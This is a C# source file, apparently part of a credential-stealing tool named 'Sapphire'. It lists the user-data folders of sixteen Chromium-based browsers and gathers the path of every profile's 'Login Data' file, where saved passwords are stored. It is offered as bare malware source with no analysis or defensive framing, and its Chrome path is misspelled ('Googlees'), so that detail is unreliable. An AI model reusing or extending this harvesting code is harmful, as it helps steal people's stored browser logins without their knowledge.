using System;
using System.IO;
using System.Collections.Generic;

namespace Sapphire
{
    
    internal sealed class Paths
    {
        private static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        private static string LocalAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";

        public static Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
        {
            {
                "Chrome",
                LocalAppdata + "Googlees\\Chrome\\User Data"
            },
            {
                "Opera",
                Appdata + "Opera Software\\Opera Stable"
            },
            {
                "Yandex",
                LocalAppdata + "Yandex\\YandexBrowser\\User Data"
            },
            {
                "Brave browser",
                LocalAppdata + "BraveSoftware\\Brave-Browser\\User Data"
            },
            {
                "Orbitum browser",
                LocalAppdata + "Orbitum"
            },
            {
                "Atom browser",
                LocalAppdata + "Mail.Ru\\Atom"
            },
            {
                "Kometa browser",
                LocalAppdata + "Kometa"
            },
            {
                "Edge Chromium",
                LocalAppdata + "Microsoft\\Edge\\User Data"
            },
            {
                "Torch browser",
                LocalAppdata + "Torch\\User Data"
            },
            {
                "Amigo",
                LocalAppdata + "Amigo\\User Data"
            },
            {
                "CocCoc",
                LocalAppdata + "CocCoc\\Browser\\User Data"
            },
            {
                "Comodo Dragon",
                LocalAppdata + "Comodo\\Dragon\\User Data"
            },
            {
                "Epic Privacy Browser",
                LocalAppdata + "Epic Privacy Browser\\User Data"
            },
            {
                "Elements Browser",
                LocalAppdata + "Elements Browser\\User Data"
            },
            {
                "CentBrowser",
                LocalAppdata + "CentBrowser\\User Data"
            },
            {
                "360 Browser",
                LocalAppdata + "360Chrome\\Chrome\\User Data"
            }
        };

        public static List<string> GetUserData(string browserPath)
        {
            List<string> loginData = new List<string>()
            {
                browserPath + "\\Default\\Login Data",
                browserPath + "\\Login Data",
            };

            if (Directory.Exists(browserPath))
            {
                foreach (string dir in Directory.GetDirectories(browserPath))
                {
                    if (dir.Contains("Profile"))
                        loginData.Add(dir + "\\Login Data");
                }
            }
            return loginData;
        }
    }
}
